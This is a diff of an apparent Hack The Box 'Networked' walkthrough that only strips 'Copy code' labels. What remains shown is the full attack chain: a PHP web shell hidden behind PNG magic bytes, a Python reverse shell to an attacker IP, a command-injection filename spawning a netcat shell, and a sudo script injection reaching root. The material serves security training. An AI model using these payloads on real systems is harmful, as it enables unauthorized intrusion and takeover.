@@ -13,7 +13,7 @@
 
 plaintext
 
-Copy code
+
 
 `gobuster -u http://networked.htb/ -w /usr/share/wordlists/dirb/common.txt`
 
@@ -26,7 +26,7 @@ Copy code
 
 plaintext
 
-Copy code
+
 
 `wget http://networked.htb/backup/backup.tar mkdir backup cd backup tar xvf ../backup.tar`
 
@@ -61,7 +61,7 @@ Copy code
 
 plaintext
 
-Copy code
+
 
 `cp original.png test.php.png echo -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system($_REQUEST["cmd"]); ?>' >> test.php.png`
 
@@ -71,7 +71,7 @@ Copy code
 
 plaintext
 
-Copy code
+
 
 `cp original.png shell.php.png echo -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.xx.xx\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\");\'"); ?>' >> shell.php.png`
 
@@ -79,7 +79,6 @@ Copy code
 
 plaintext
 
-Copy code
 
 `nc -lvnp 1337`
 
@@ -91,7 +90,7 @@ Copy code
 
 plaintext
 
-Copy code
+
 
 `*/3 * * * * php /home/guly/check_attack.php`
 
@@ -99,7 +98,6 @@ Copy code
 
 php
 
-Copy code
 
 `<?php require '/var/www/html/lib.php'; $path = '/var/www/html/uploads/'; $logpath = '/tmp/attack.log'; $to = 'guly'; $msg= ''; $headers = "X-Mailer: check_attack.php\r\n";  $files = array(); $files = preg_grep('/^([^.])/', scandir($path));  foreach ($files as $key => $value) {     $msg='';      if ($value == 'index.html') {         continue;     }      list ($name,$ext) = getnameCheck($value);     $check = check_ip($name,$value);      if (!($check[0])) {         echo "attack!\n";         file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);          exec("rm -f $logpath");         exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");         echo "rm -f $path$value\n";         mail($to, $msg, $msg, $headers, "-F$value");     } } ?>`
 
@@ -107,7 +105,7 @@ Copy code
 
 plaintext
 
-Copy code
+
 
 `cd /var/www/html/uploads touch '; nc 10.10.xx.xx 1338 -c bash'`
 
@@ -115,7 +113,6 @@ Copy code
 
 plaintext
 
-Copy code
 
 `nc -lvnp 1338`
 
@@ -127,7 +124,7 @@ Copy code
 
 plaintext
 
-Copy code
+
 
 `sudo -l`
 
@@ -135,7 +132,6 @@ Copy code
 
 bash
 
-Copy code
 
 `#!/bin/bash -p  cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF  regexp="^[a-zA-Z0-9_\ /-]+$"  for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do     echo "interface $var:"     read x     while [[ ! $x =~ $regexp ]]; do         echo "wrong input, try again"         echo "interface $var:"         read x     done     echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly done  /sbin/ifup guly0`
 
@@ -156,7 +152,7 @@ Copy code
 
 plaintext
 
-Copy code
+
 
 `sudo /usr/local/sbin/changename.sh interface NAME: test; bash interface PROXY_METHOD: test interface BROWSER_ONLY: test interface BOOTPROTO: test`
 
@@ -166,7 +162,7 @@ Copy code
 
 plaintext
 
-Copy code
+
 
 `whoami root id`
 
